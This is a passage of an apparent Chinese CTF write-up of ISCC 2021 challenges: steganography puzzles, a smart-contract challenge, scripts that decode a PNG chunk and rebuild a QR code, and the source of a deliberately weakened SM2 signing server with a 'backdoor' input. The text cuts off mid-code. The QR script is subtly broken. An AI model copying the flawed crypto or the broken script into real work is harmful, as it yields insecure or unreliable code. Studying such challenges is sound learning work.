src="https://img-blog.csdnimg.cn/20210526091711997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改为jpg<br><img src="https://img-blog.csdnimg.cn/20210526091822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>海市蜃楼-1的flag也有猫腻，结合flag和图片，最终得到压缩包的口令为zhongnanshan，解压海市蜃楼-2的压缩包<br><img src="https://img-blog.csdnimg.cn/20210526092109814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码得到一个网址，内容为<code>ZWFzeQ==</code>，base解码后为<code>easy</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://ctewm.com/aTvQcE/kva11w<br></code></pre></td></tr></table></figure><p>继续往下走，foremost分离图片得到压缩包，口令为easy</p><p><img src="https://img-blog.csdnimg.cn/20210526092546155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Hack-the-Victim"><a href="#Hack-the-Victim" class="headerlink" title="Hack the Victim"></a>Hack the Victim</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">Victim为含有漏洞的智能合约，在 Rinkeby测试网络的合约地址为：<br><span class="hljs-number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span><br>接口为：<br>contract Victim &#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> memory </span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ISCC&#123;xxxxx&#125;&quot;</span>;<br>&#125;<br>&#125;<br>请编写攻击合约，实现对 Victim 的攻击，获取 flag。<br></code></pre></td></tr></table></figure><p>合约地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://rinkeby.etherscan.io/address/0x68D28fE315E6A344029D42915Fbc7af4261AB833<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506204015536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>16进制转字符串<br><img src="https://img-blog.csdnimg.cn/20210506204048675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以直接点击Decompile ByteCode进行反编译<br><img src="https://img-blog.csdnimg.cn/20210526133856346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h3><blockquote><p>题目描述：你真的了解png文件的格式吗？</p></blockquote><p>用pngcheck检查一下图片，发现最后一个IDAT块异常<br><img src="https://img-blog.csdnimg.cn/20210517162639589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>010复制出来<br><img src="https://img-blog.csdnimg.cn/20210517162450658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本解压zlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 52 09 0E C0 20 0C FA 12 FC FF 73 CB 6A</span><br><span class="hljs-string">39 54 97 4C 7B 41 2B E4 2C 00 3C DF 7F 04 69 B3</span><br><span class="hljs-string">AC E7 CA D9 27 E4 37 1D 27 15 33 01 E3 91 75 AB</span><br><span class="hljs-string">9D F4 D7 29 F3 E2 AF 13 75 21 CC AC 69 3D BB C8</span><br><span class="hljs-string">0A 2F 8C E0 26 D0 25 F9 F4 62 A2 08 C5 0A A0 69</span><br><span class="hljs-string">90 35 0D 34 E1 39 8B 8B 2A 5D A0 CA DE B4 FE 23</span><br><span class="hljs-string">61 59 CB 60 3B EE DA 82 5E 2E 1E E2 46 15 D8 8D</span><br><span class="hljs-string">AE 46 33 54 95 23 8A AD 82 FD C0 F5 CC 86 2C 76</span><br><span class="hljs-string">69 1F 34 74 8D 5F 22 70 2B 86 8A CC FA 69 EA 6D</span><br><span class="hljs-string">A4 12 DC 99 A5 21 08 B9 27 5F F3 37 40 A4 8C AA</span><br><span class="hljs-string">E7 1A A5 BE F4 AB E2 A5 B3 68 21 23 C6 07 2E D4</span><br><span class="hljs-string">9F 5D E1 77 9E 9A</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110<br></code></pre></td></tr></table></figure><p>直接binwalk图片，也能得到同样的结果<br><img src="https://img-blog.csdnimg.cn/20210518191058101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一共841位，猜测是29*29的二维码，直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quotquot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">841</span>,<span class="hljs-number">841</span>,<span class="hljs-number">841</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫码得到flag</p><h3 id="变异的SM2"><a href="#变异的SM2" class="headerlink" title="变异的SM2"></a>变异的SM2</h3><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#server.py</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> func, sm2<br><span class="hljs-comment"># from flag import FLAG</span><br>FLAG=<span class="hljs-string">&quot;&#123;testFlag&#125;&quot;</span><br><br>sm2p256v1_ecc_table = &#123;<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> +<br>         <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,<br>&#125;<br>n = <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span><br>G = <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> \<br>    <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span>(<span class="hljs-params">tsm2</span>):</span><br>    data = func.random_hex(<span class="hljs-built_in">len</span>(n)) <br>    k1_str = func.random_hex(<span class="hljs-built_in">len</span>(n))<br>    print(tsm2.send_p1(data, k1_str))<br>    backdoor = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;backdoor:&#x27;</span>).strip()<br>    result = tsm2.output_p1(k1_str, backdoor)<br>    print(result)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">tsm2</span>):</span><br>    message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    sign = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;sign:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    check = tsm2.verify(sign, message)<br>    <span class="hljs-keyword">if</span> check <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> message == <span class="hljs-string">b&#x27;Hello, Welcome to ISCC2021!&#x27;</span>:<br>        print(FLAG)<br>    <span class="hljs-keyword">else</span>:<br>        print(check)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TSM2</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, sk</span>):</span><br>        ecc_table = sm2p256v1_ecc_table<br>        self.ecc_table = ecc_table<br>        self.n = <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-number">16</span>)<br>        self.para_len = <span class="hljs-built_in">len</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>])<br>        self.ecc_a3 = (<span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;a&#x27;</span>], base=<span class="hljs-number">16</span>) + <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>        self.sk = <span class="hljs-built_in">int</span>(sk, <span class="hljs-number">16</span>)<br>        self.pk = self._kg(self.sk, ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        <br>        self.sks = <span class="hljs-built_in">int</span>(func.random_hex(self.para_len), <span class="hljs-number">16</span>)<br>        self.pks = <span class="hljs-built_in">pow</span>((self.sk + <span class="hljs-number">1</span>) * self.sks, self.n - <span class="hljs-number">2</span>, self.n) % self.n<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_p1</span>(<span class="hljs-params">self, data, k1_str</span>):</span><br>        e = <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        k1 = k1 % self.n<br>        R1 = self._kg(k1, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%0128s&#x27;</span> % (e, R1) <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">output_p1</span>(<span class="hljs-params">self, k1_str, r_s2_s3</span>):</span><br>        r = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s2 = <span class="hljs-built_in">int</span>(r_s2_s3[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        s3 = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">2</span> * self.para_len:], <span class="hljs-number">16</span>)<br><br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        d1 = self.sks<br>        s = (d1 * k1 * s2 + d1 * s3 - r) % self.n <br>        <span class="hljs-keyword">if</span> s == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> s == (self.n - r):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%064x&#x27;</span> % (r, s)  <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self, Sign, data</span>):</span><br>        r = <span class="hljs-built_in">int</span>(Sign[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s = <span class="hljs-built_in">int</span>(Sign[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        e = <span class="hljs-built_in">int</span>(data.<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>        t = (r + s) % self.n<br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        P1 = self._kg(s, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        P2 = self._kg(t, self.pk)<br><br>        <span class="hljs-keyword">if</span> P1 == P2:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._double_point(P1)<br>        <span class="hljs-keyword">else</span>:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._add_point(P1, P2)<br>            P1 = self._convert_jacb_to_nor(P1)<br><br>        x = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> r == ((e + x) % self.n)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_kg</span>(<span class="hljs-params">self, k, Point</span>):</span> <br>        <span class="hljs-keyword">if</span> (k % self.n) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span><br>        Point = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (Point, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        mask_str = <span class="hljs-string">&#x27;8&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len - <span class="hljs-number">1</span>):<br>            mask_str += <span class="hljs-string">&#x27;0&#x27;</span><br>        mask = <span class="hljs-built_in">int</span>(mask_str, <span class="hljs-number">16</span>)<br>        Temp = Point<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len * <span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">if</span> flag:<br>                Temp = self._double_point(Temp)<br>            <span class="hljs-keyword">if</span> (k &amp; mask) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> flag:<br>                    Temp = self._add_point(Temp, Point)<br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-literal">True</span><br>                    Temp = Point<br>            k = k &lt;&lt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self._convert_jacb_to_nor(Temp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_double_point</span>(<span class="hljs-params">self, Point</span>):</span> <br>        l = <span class="hljs-built_in">len</span>(Point)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        <span class="hljs-keyword">if</span> l &lt; self.para_len * <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            x1 = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y1 = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l == len_2:<br>                z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                z1 = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br><br>            T6 = (z1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y1 * y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (x1 - T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (y1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * <span class="hljs-number">8</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (x1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (T6 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (self.ecc_a3 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            z3 = (T3 + T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            x3 = (T3 - T5) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            <span class="hljs-keyword">if</span> (T5 % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br>                T4 = (T5 + ((T5 + <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)) &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">else</span>:<br>                T4 = (T5 + (T5 &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            T1 = (T1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (x3, y3, z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_add_point</span>(<span class="hljs-params">self, P1, P2</span>):</span> <br>        <span class="hljs-keyword">if</span> P1 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P2, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">if</span> P2 == <span 